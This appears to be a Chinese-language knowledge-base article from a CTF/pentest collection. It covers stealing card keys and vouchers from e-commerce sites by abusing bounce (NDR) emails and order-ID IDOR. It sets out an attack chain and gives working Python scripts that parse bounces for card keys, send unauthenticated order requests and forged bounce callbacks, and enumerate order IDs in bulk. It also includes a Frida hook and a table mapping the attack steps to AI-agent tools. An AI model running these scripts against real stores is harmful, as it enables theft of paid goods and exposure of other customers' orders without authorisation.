---
id: "ctf-website/12-payment/payment-email-bounce-idor"
title: "退信滥用 + 订单号授权绕过"
title_en: "Bounce Email Abuse + Order ID Authorization Bypass to Steal Card Keys"
summary: >
  利用退信（NDR/Bounce）逻辑中的信息泄露和授权绕过漏洞，通过构造不存在邮箱触发退信，
  结合订单号 IDOR 批量提取数据库中的卡密和优惠券码。
summary_en: >
  Exploits information disclosure and authorization bypass in bounce email (NDR) logic — triggering bounces
  with non-existent email addresses, combined with order ID IDOR, to extract card keys and voucher codes in bulk.
board: "ctf-website"
category: "12-payment"
signals: ["退信", "NDR", "bounce", "IDOR", "订单号", "卡密泄露", "order leak", "CWE-639", "CWE-862"]
mcp_tools: ["http_probe", "kb_router", "kb_read_file"]
keywords: ["退信攻击", "bounce email", "IDOR", "订单越权", "卡密泄露", "CWE-639", "NDR利用", "邮件退信链"]
difficulty: "advanced"
tags: ["idor", "email-bounce", "information-disclosure", "payment", "ctf"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: ["ctf-website/14-idor/01-idor-enumeration", "ctf-website/12-payment/payment-digital-goods", "ctf-website/12-payment/payment-callback-async", "ctf-website/24-database/05-backup-log-leak"]
---
# 退信滥用 + 订单号授权绕过

## 场景

电商与数字商品系统在处理订单通知邮件时，退信（NDR/Bounce）逻辑可能存在信息泄露与授权绕过，未授权请求可通过退信内容或退信处理接口，结合订单号 IDOR 访问他人订单详情或兑换凭证。

## 输入信号

- 下单后系统自动发送含卡密/激活码/订单详情的邮件
- 邮件发送到不存在地址时产生退信（Non-Delivery Receipt）
- 退信内容包含原始邮件正文（含卡密）
- 订单详情页/API 仅通过订单号查询，不验证用户身份
- 订单号可预测（自增 ID、短随机串、时间戳序列）
- 退信处理端点（webhook/API）对外暴露且无来源验证

## 漏洞分类

### 类型 1：退信 NDR 内容泄露

```
下单(假邮箱) → 系统发邮件(含卡密) → 不存在 → 退信
                                            │
                                    退信包含原始邮件内容
                                            │
                                    攻击者通过退信渠道拿到卡密
```

**关键条件**：
- 邮件服务器将原始邮件内容回传在退信中
- 系统未过滤退信中的敏感信息
- 退信能被攻击者接收或读取

### 类型 2：退信处理接口 IDOR

```
下单(假邮箱) → 退信回到系统 → 退信处理接口解析订单号
                                    │
                            接口未验证调用者身份
                                    │
                            攻击者直接调接口 → 查任意订单卡密
```

**关键条件**：
- 退信处理是独立的 webhook/API 端点
- 端点未做来源 IP 白名单或签名验证
- 凭订单号即可查询订单完整信息

### 类型 3：订单查询接口无鉴权（CWE-639 / CWE-862）

```
攻击者知道订单号 → GET /orders/{id} → 返回完整订单含卡密
```

## 判定矩阵

| 信号 | 直接动作 | 命中样本 | 失败样本 |
|------|----------|----------|----------|
| 订单号自增或短随机串 | 匿名/B 账号请求 A 订单详情 | 返回 `status/amount/card_key/download_url` | 只返回公共状态或 404 |
| 邮件链接含 `order_id/token` | 改 `order_id`、保留 token、换账号访问 | token 不绑定订单或邮箱 | token 与订单/邮箱强绑定 |
| 退信含原始正文 | 用不存在邮箱下单，解析 NDR multipart | 原始 HTML/文本里有卡密/下载链接 | 只返回 SMTP headers |
| 退信 webhook 暴露 | 构造 DSN JSON/XML/表单回调 | 回调响应带订单对象或触发重发 | 仅接受真实队列事件 |
| 订单查询 GraphQL | 替换 `id/orderNo/email` 参数 | 非所有者读到订单节点 | resolver 过滤当前用户 |
| 下单即预生成卡密 | 未支付订单触发通知/退信 | 未支付也能看到卡密字段 | 发货时才生成卡密 |

### 邮件/订单/卡密三元组

退信链的核心不是“邮箱不存在”，而是邮件、订单和发货账本的绑定关系被拆开了。先把三元组建出来，再决定走退信、订单 IDOR、回调或数据库路线。

| 维度 | 证据字段 | 操作 | 命中后下一跳 |
|---|---|---|---|
| 邮件 | `Message-ID`, `Return-Path`, `X-Original-To`, 收件人 | 解析 NDR multipart 与原始正文 | 邮件模板、重发接口 |
| 订单 | `order_id`, `order_sn`, `out_trade_no`, `trade_no` | 匿名/跨账号/退信 token 对比 | IDOR、回调重放 |
| 卡密/权益 | `card_key`, `coupon`, `download_url`, `license` | 未支付/已支付/退款后三态回读 | 数字商品、发货状态机 |
| 数据库 | 表前缀、字段名、报错、日志片段 | 反推订单表和凭证表 | 备份/日志、支付状态机 |
| 支付 | `status`, `paid_at`, `amount`, `refund_id` | 观察退信是否触发重发/补发 | 支付状态机、异步队列 |

三元组解析器：

```python
# bounce_order_tuple_extractor.py
import csv
import email
import email.policy
import json
import re
from pathlib import Path

PATTERNS = {
    "order_id": re.compile(r"(?:order[_ -]?(?:id|sn|no)|out_trade_no|trade_no)[\"'=:\s]+([A-Za-z0-9_-]{4,64})", re.I),
    "card_key": re.compile(r"(?:card[_ -]?key|卡密|兑换码|license|secret)[\"'=:\s：]+([A-Za-z0-9_-]{6,128})", re.I),
    "payment": re.compile(r"(?:amount|money|paid_at|payment_status|refund_id)[\"'=:\s]+([^<>\s,]{1,80})", re.I),
    "download": re.compile(r"https?://[^\s\"'<>]+(?:download|card|order|license)[^\s\"'<>]*", re.I),
}

def parts(msg):
    if msg.is_multipart():
        for part in msg.walk():
            if part.get_content_maintype() == "text":
                yield part.get_content()
    else:
        yield msg.get_content()

def extract_one(path):
    msg = email.message_from_string(Path(path).read_text(encoding="utf-8", errors="ignore"), policy=email.policy.default)
    text = "\n".join(parts(msg))
    row = {
        "file": Path(path).name,
        "message_id": msg.get("Message-ID", ""),
        "return_path": msg.get("Return-Path", ""),
        "original_to": msg.get("X-Original-To", ""),
    }
    for key, rx in PATTERNS.items():
        row[key] = "|".join(sorted(set(rx.findall(text))))[:500]
    return row

def extract_dir(mail_dir, out_csv="exports/bounce_order_tuple.csv"):
    rows = [extract_one(p) for p in Path(mail_dir).glob("*.eml")]
    Path("exports").mkdir(exist_ok=True)
    if not rows:
        Path(out_csv).write_text("file,message_id,return_path,original_to,order_id,card_key,payment,download\n", encoding="utf-8")
        return []
    with open(out_csv, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=rows[0].keys())
        w.writeheader()
        w.writerows(rows)
    Path("exports/bounce_order_tuple.json").write_text(json.dumps(rows, ensure_ascii=False, indent=2), encoding="utf-8")
    return rows
```

判定节奏：

1. 定位订单查询、通知重发与支付回调路径。
2. 生成一组可控订单：正常邮箱、不可达邮箱、同域别名、大小写邮箱。
3. 把 NDR 原文、订单详情、支付状态回读对齐成 `bounce_order_tuple.csv`。
4. 如果退信里有 `order_id` 但无卡密，继续打订单详情/重发接口。
5. 如果退信里出现字段名或 SQL 报错，转数据库备份/日志链补表结构。

## 攻击链

```
1. 侦察：注册/下单流程抓包，确认订单号格式（自增/时间戳/UUID）
2. 获取订单号：支付回调 URL、邮件链接、页面跳转 Referer、Burp 被动扫描
3. 测试订单查询接口：不带 Cookie/Token 直接 GET /order/detail?id=1001
   → 若返回订单信息 + 卡密 → 直接 IDOR，跳过后续步骤
4. 若需要"支付后才发兑换码"：填假邮箱下单但不支付
   → 部分系统下单时已生成卡密入库，只是不展示
   → 退信触发时系统可能把卡密回显
5. 退信利用：
   a. 发送大量邮件到 @nonexist.example.com → 触发退信
   b. 分析退信内容，提取卡密字段
   c. 如果退信是 webhook 回调：模拟 NDR 格式 POST 到系统退信端点
6. 批量枚举：遍历订单号 → 收集卡密/下载链接/flag → 回填命中与失败样本
```

## Frida/JS Hook 辅助

```javascript
// 场景：分析 APK/Web 应用的订单查询逻辑
// Hook 关键函数确认鉴权缺失

// 1. Hook OkHttp 请求（Android APK）
Java.perform(function() {
    var OkHttpClient = Java.use("okhttp3.OkHttpClient");
    var Request = Java.use("okhttp3.Request");
    Request.newBuilder.implementation = function() {
        var builder = this.newBuilder.apply(this, arguments);
        console.log("[OkHttp] URL:", builder.build().url().toString());
        console.log("[OkHttp] Headers:", builder.build().headers().toString());
        return builder;
    };
});

// 2. 修改订单号参数测试越权
// Burp Suite Intruder: 对 orderId 参数做枚举
// Payload: 自增 1000-9999
```

## HTTP 探测

```python
# 探测订单详情接口是否存在 IDOR
import requests

def test_order_idor(base_url, order_id_range):
    """测试订单查询接口是否需要鉴权"""
    for oid in order_id_range:
        # 不带 Cookie 请求
        r = requests.get(f"{base_url}/api/order/detail", params={"id": oid})
        if r.status_code == 200 and ("卡密" in r.text or "voucher" in r.text.lower()):
            print(f"[!] IDOR found: order {oid} leaks card key")
            print(f"    Response: {r.text[:500]}")

        # 测试退信回调接口
        r2 = requests.post(f"{base_url}/api/bounce/callback", json={
            "order_id": oid,
            "bounce_type": "permanent",
            "email": "nonexist@fake.example.com"
        })
        if r2.status_code == 200:
            print(f"[!] Bounce callback accessible: order {oid}")
            print(f"    Response: {r2.text[:500]}")

test_order_idor("https://target.com", range(1000, 1100))
```

### 订单窗口枚举器

```python
import csv
import re
import requests

KEY_RX = re.compile(r"(card[_-]?key|voucher|coupon|download|flag\{[^}]+\})", re.I)

def enumerate_orders(base, start, end, cookie=None):
    s = requests.Session()
    if cookie:
        s.headers["Cookie"] = cookie
    rows = []
    for oid in range(start, end + 1):
        for path in (f"/order/{oid}", "/api/order/detail"):
            params = {} if path.startswith("/order/") else {"id": oid}
            r = s.get(base + path, params=params, timeout=8, allow_redirects=False)
            hit = bool(KEY_RX.search(r.text))
            rows.append({
                "order_id": oid,
                "path": path,
                "status": r.status_code,
                "length": len(r.text),
                "hit": hit,
                "sample": r.text[:160].replace("\n", "\\n"),
            })
            if hit:
                print("[hit]", oid, path, r.text[:240])
    with open("order_bounce_idor_matrix.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=rows[0].keys())
        w.writeheader()
        w.writerows(rows)
```

## 下一跳矩阵

| 命中结果 | 下一步 | 关联文档 |
|----------|--------|----------|
| 读到卡密/下载链接 | 检查是否绑定订单所有者、是否可重复领取 | `payment-digital-goods.md` |
| 读到支付状态/金额 | 尝试替换回调里的 `order_id/out_trade_no` | `payment-callback-async.md` |
| 读到邮箱/手机号 | 构造退信、找邮件模板、找通知重发接口 | 本文 |
| 读到商品/sku/plan | 做低价 SKU + 高价权益错配 | `payment-logic.md` |
| 读到数据库字段名 | 反推订单表、卡密表、优惠券表 | `../24-database/05-backup-log-leak.md` |

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动检测上述漏洞：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| HTTP 探测订单接口 | `http_probe` | 无 Cookie 请求订单 API，观察响应是否泄露卡密 |
| 按信号查知识库 | `kb_router` | 搜索 IDOR/bounce/order leak 相关技术文件 |
| 阅读技术细节 | `kb_read_file` | 读取本文档获取完整攻击链 |
| 批量测试 | 编写 Python 脚本 | 循环枚举订单号，检测 IDOR |

## Evidence

- `order_probe_matrix.csv`: order_id、email/token、登录态、状态码、响应长度、关键字段。
- `bounce_payloads.json`: 退信/邮件链接里的订单号、签名、一次性 token、过期时间。
- `role_compare.json`: 匿名、订单所有者、其他用户、管理员的响应字段 diff。
- `order_bounce_idor_matrix.csv`: 订单窗口枚举输出、命中字段、响应样本。
- 成功样本: 非订单所有者读到订单、支付状态、下载链接、优惠券或 flag。
- 失败样本: 只返回公共状态、链接过期、token 绑定邮箱或订单所有者。
